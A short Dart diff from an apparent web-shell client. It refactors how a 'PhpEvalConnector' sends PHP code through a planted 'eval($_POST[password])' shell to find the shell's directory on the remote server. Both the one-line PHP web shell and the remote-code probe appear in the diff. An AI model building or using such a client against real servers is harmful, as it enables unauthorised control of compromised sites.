@@ -6,6 +6,7 @@ import 'package:http/http.dart' as http;
 
 import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
+import 'shell_script_dir_probe.dart';
 import 'shell_connector.dart';
 
 /// `php_eval_post.php`：`eval($_POST[password])`
@@ -142,13 +143,11 @@ class PhpEvalConnector extends ShellConnector {
 
   @override
   Future<String?> getShellScriptDir() async {
+    final base = ShellScriptDirProbe.safeBasenameFromUrl(webshell.url);
     final r = (await sendPhpCode(
-      '\$f=isset(\$_SERVER["SCRIPT_FILENAME"])?\$_SERVER["SCRIPT_FILENAME"]:"";'
-      '\$d=(\$f!=="")?@realpath(dirname(\$f)):false;'
-      'if(\$d===false||\$d===""){\$f2=explode("(",__FILE__)[0];\$d=@realpath(dirname(\$f2));}'
-      'echo(\$d!==false&&\$d!=="")?\$d:"";',
+      ShellScriptDirProbe.phpResolveScriptDirCode(base),
     )).trim();
-    if (r.isEmpty || r.startsWith('[')) return null;
+    if (!ShellScriptDirProbe.isUsableRemotePath(r)) return null;
     return r;
   }
 
